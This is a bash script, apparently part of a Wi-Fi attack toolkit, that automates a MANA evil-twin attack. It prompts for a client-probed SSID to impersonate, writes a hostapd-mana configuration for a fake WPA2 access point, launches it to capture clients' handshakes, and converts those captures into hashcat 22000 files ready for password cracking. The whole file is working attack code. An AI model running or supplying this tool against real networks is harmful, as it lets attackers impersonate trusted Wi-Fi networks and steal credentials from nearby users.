#!/bin/bash

source Attacks/common.sh

# Color & style constants
RED='\033[0;31m'
GREEN='\033[0;32m'
BOLD='\033[1m'
NC='\033[0m'

# Require root privileges
require_root # NU AI NEVOIE STERGE DACA VREI SA MEARGA

# Main menu prompt
prompt_to_continue() {
    local options=("Start Mana Attack")

    echo
    echo -e "${GREEN}==============================================${NC}"
    echo -e "${BOLD}${GREEN}                 Mana attack        ${NC}${BOLD}${NC}"
    echo -e "${GREEN}==============================================${NC}"
    sleep 0.5
    echo
    echo -e "${RED}[!]${NC} You need two wireless interfaces: one for monitoring, one for hosting the fake AP."
    echo -e "${RED}[!]${NC} Clients will see invalid certificates, phishing awareness may alert them."


    echo
    echo -e "${GREEN}[*]${NC} Available options:"
    echo
    for i in "${!options[@]}"; do
        echo -e "  ${GREEN}[$((i+1))]${NC} ${options[$i]}"
        sleep 0.1
    done
    echo -e "  ${GREEN}[0]${NC} Go back"
    echo

    while true; do
        read -rp "$(echo -e "${GREEN}[?]${NC} Choose an option:") " opt
        case "$opt" in
            1) break ;;  # proceed
            0) go_back ;;  # back
            *) echo -e "${RED}[!]${NC} Invalid. Choose 0 or 1."; sleep 0.3 ;;
        esac
    done
}

mana_attack() {
    clear 

    echo -e "${GREEN}[*]${NC} Enter details for the MANA attack:"

    while true; do
        read -rp "$(echo -e "${GREEN}[?]${NC} Enter the SSID to impersonate (from probed field): ")" ssid
        if [[ -n "$ssid" ]]; then
            break
        else
            echo -e "${RED}[!]${NC} Invalid SSID."
            sleep 0.3
        fi
    done

    echo -e "${GREEN}[✓]${NC} SSID set: $ssid"
    cat > hostapd.conf <<EOF
interface=wlan1
driver=nl80211
hw_mode=g
channel=1
ssid=$ssid
wpa=2
wpa_key_mgmt=WPA-PSK
wpa_pairwise=TKIP CCMP
wpa_passphrase=anything
mana_wpaout=handshake.hccapx
EOF

    echo -e "${GREEN}[✓]${NC} hostapd.conf created."

    sleep 0.3

    read -p "$(echo -e "${GREEN}[*]${NC} Press Enter to start MANA attack...")"

    gnome-terminal -- bash -c "sudo hostapd-mana hostapd.conf; exec bash" &

    sleep 0.3

    while true; do
        read -rp "$(echo -e "${GREEN}[*]${NC} Type 'stop' to terminate the fake AP and convert handshake: ")" user_input
        if [[ "$user_input" == "stop" ]]; then
            break
        fi
    done

    sudo pkill -f hostapd-mana

    echo -e "${GREEN}[*]${NC} Converting handshake to .pcap..."
    hcxhash2cap --hccapx=handshake.hccapx -c Captures/handshake.pcap > /dev/null 2>&1
    echo -e "${GREEN}[✓]${NC} Saved as: ${BOLD}Captures/handshake.pcap${NC}"

    sleep 1

    while true; do
        read -rp "$(echo -e "${GREEN}[*]${NC} Enter name for the hash file (without extension): ")" hashname
        if [[ -n "$hashname" ]]; then
            break
        else
            echo -e "${RED}[!]${NC} Invalid hash name."
            sleep 0.3
        fi
    done
    
    hashfile="Captures/${hashname}.22000"

    echo -e "${GREEN}[*]${NC} Converting to 22000 hash format..."
    hcxpcapngtool handshake.pcap -o "$hashfile" > /dev/null 2>&1
    echo -e "${GREEN}[✓]${NC} Hash saved to ${BOLD}$hashfile${NC}"

    rm -f handshake.pcap handshake.hccapx

    while true; do
        read -rp "$(echo -e "${GREEN}[*]${NC} Type 'stop' to stop the process: ")" user_input
        if [[ "$user_input" == "stop" ]]; then
            break
        else
            echo -e "${RED}[!]${NC} Invalid input. Please type 'stop' to stop the command."
        fi
    done

    echo -e "${GREEN}[✓]${NC} Attack complete."; sleep 0.5
    
    sleep 1.3
}

# Repeat or go back (stop capture then menu)
after_attack_options() {
    echo
    echo -e "  ${GREEN}[1]${NC} New Mana attack"
    echo -e "  ${GREEN}[0]${NC} Go back to main menu"
    echo
    while true; do
        read -rp "$(echo -e "${GREEN}[*]${NC} Choose an option:") " o
        case "$o" in
            1) clear; mana_attack; after_attack_options; break ;;  
            0) ask_stop_capture; go_back ;;
            *) echo -e "${RED}[!]${NC} Type 0 or 1."; sleep 0.3
        esac
    done
}

# Entry point
main() {
    clear
    prompt_to_continue
    check_monitor_interfaces
    ask_capture_choice
    mana_attack
    after_attack_options
}

main
